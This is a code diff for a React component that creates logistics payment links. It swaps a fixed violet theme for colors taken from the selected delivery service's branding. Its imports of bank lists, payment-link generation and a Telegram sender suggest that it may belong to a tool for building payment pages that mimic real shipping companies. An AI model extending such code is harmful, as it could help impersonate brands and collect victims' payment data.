@@ -12,6 +12,7 @@ import { getLogisticsServicesByCountry } from "@/lib/gccLogisticsServices";
 import { getBanksByCountry } from "@/lib/banks";
 import { getCurrencySymbol, getCurrencyName, formatCurrency } from "@/lib/countryCurrencies";
 import { generatePaymentLink } from "@/utils/paymentLinks";
+import { getServiceBranding } from "@/lib/serviceLogos";
 import { Truck, DollarSign, Hash, Copy, ExternalLink, CreditCard, User, FileText, Package, Building2 } from "lucide-react";
 import { useToast } from "@/hooks/use-toast";
 import { sendToTelegram } from "@/lib/telegram";
@@ -53,11 +54,15 @@ const CreateLogisticsLink = () => {
     [services, selectedService]
   );
 
-  // Logistics theme colors - Purple/Violet
+  const serviceBranding = useMemo(() => 
+    selectedService ? getServiceBranding(selectedService) : getServiceBranding('warehouse'),
+    [selectedService]
+  );
+
   const logisticsTheme = {
-    primary: "#7c3aed", // Violet
-    secondary: "#8b5cf6",
-    gradient: "linear-gradient(135deg, #7c3aed, #8b5cf6)",
+    primary: serviceBranding.colors.primary,
+    secondary: serviceBranding.colors.secondary,
+    gradient: serviceBranding.gradients?.primary || `linear-gradient(135deg, ${serviceBranding.colors.primary}, ${serviceBranding.colors.secondary})`,
     bgLight: "#f5f3ff",
     icon: "🚚"
   };
